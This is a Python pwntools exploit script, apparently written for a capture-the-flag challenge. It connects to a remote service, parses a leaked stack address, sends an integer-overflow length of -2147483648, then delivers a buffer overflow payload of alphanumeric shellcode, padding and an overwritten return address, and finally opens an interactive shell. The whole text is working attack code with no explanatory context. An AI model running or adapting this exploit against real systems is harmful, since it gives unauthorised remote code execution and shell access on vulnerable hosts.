#!/usr/bin/python
from pwn import *
import time
import getopt
import sys

opts,argv=getopt.getopt(sys.argv[1:], 't:p:')

for k,v in opts:
    if k == '-t':
        target=v
    elif k == '-p':
        port=v

shellcode=b"XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

io=remote(target, port)
response=str(io.recvuntil(b":"),'utf-8')
print (response)

io.sendline(b"y")
print ("> We sent y\n")

response=str(io.recvuntil(b"Email:"),'utf-8')
print (response.strip())

l=response.split(' ',12)
leak=l[7].split('\n',1)

io.sendline(b"A")
print ("> Address is "+leak[0]+" and we sent a\n")

response=str(io.recvuntil(b"Age:"),'utf-8')
print (response.strip())

io.sendline(b"1")
print ("> We sent 1\n")

response=str(io.recvuntil(b"name:"),'utf-8')
print (response.strip())

io.sendline(b"-2147483648")
print ("> We sent -2147483648")

response=str(io.recvuntil(b"Name:"),'utf-8')
print (response.strip())

addr=int(leak[0],16)-0x60

payload=shellcode
payload+=b"A"*(104-len(shellcode))
payload+=p64(addr)

io.sendline(payload)
print ("> Payload sent\n")

io.interactive()


